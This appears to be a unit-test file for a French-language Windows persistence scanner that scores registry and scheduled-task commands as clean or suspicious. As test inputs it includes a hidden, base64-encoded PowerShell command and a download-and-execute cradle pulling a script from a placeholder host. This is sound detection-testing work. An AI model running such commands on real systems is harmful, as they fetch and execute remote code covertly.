import csv
import io
import unittest
from pathlib import Path

from pyguard.persistence import Entry, analyze_entry, extract_path, parse_schtasks_csv


def run(command: str) -> Entry:
    return analyze_entry(Entry("registre", "test", "x", command))


class PersistenceTests(unittest.TestCase):
    def test_normal_program_is_clean(self):
        e = run(r'"C:\Program Files\MonApp\app.exe" --background')
        self.assertEqual(e.verdict, "clean")

    def test_encoded_hidden_powershell_is_suspicious(self):
        e = run("powershell.exe -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")
        self.assertEqual(e.verdict, "suspicious")
        self.assertIn("PowerShell avec commande encodée (base64)", e.reasons)
        self.assertIn("fenêtre cachée", e.reasons)

    def test_temp_folder_adds_points(self):
        e = run(r"C:\Users\bob\AppData\Local\Temp\update.exe")
        self.assertGreaterEqual(e.score, 25)
        self.assertIn("exécuté depuis un dossier temporaire", e.reasons)

    def test_download_cradle_is_suspicious(self):
        e = run("cmd /c powershell iex (iwr http://exemple.test/a.ps1)")
        self.assertEqual(e.verdict, "suspicious")

    def test_double_extension(self):
        e = run(r"C:\Users\bob\Documents\facture.pdf.exe")
        self.assertIn("double extension (exécutable déguisé)", e.reasons)

    def test_extract_path(self):
        self.assertEqual(extract_path(r'"C:\A B\x.exe" -s'), Path(r"C:\A B\x.exe"))
        self.assertEqual(extract_path(r"C:\Tools\x.exe -s"), Path(r"C:\Tools\x.exe"))
        self.assertIsNone(extract_path("N/A"))

    def test_parse_schtasks(self):
        def row(name, command):
            r = [""] * 28
            r[0], r[1], r[8] = "PC", name, command
            return r

        buf = io.StringIO()
        w = csv.writer(buf, quoting=csv.QUOTE_ALL)
        w.writerow(row(r"\Microsoft\Windows\Defrag\ScheduledDefrag", r"%windir%\system32\defrag.exe"))
        w.writerow(row(r"\MaTache", r"C:\Users\bob\AppData\Local\Temp\x.exe"))
        w.writerow(row(r"\MaTache", r"C:\Users\bob\AppData\Local\Temp\x.exe"))  # doublon
        w.writerow(row(r"\ComTask", "COM handler"))
        entries = parse_schtasks_csv(buf.getvalue())
        self.assertEqual([e.name for e in entries], [r"\MaTache"])
        self.assertEqual(len(parse_schtasks_csv(buf.getvalue(), include_microsoft=True)), 2)


if __name__ == "__main__":
    unittest.main()
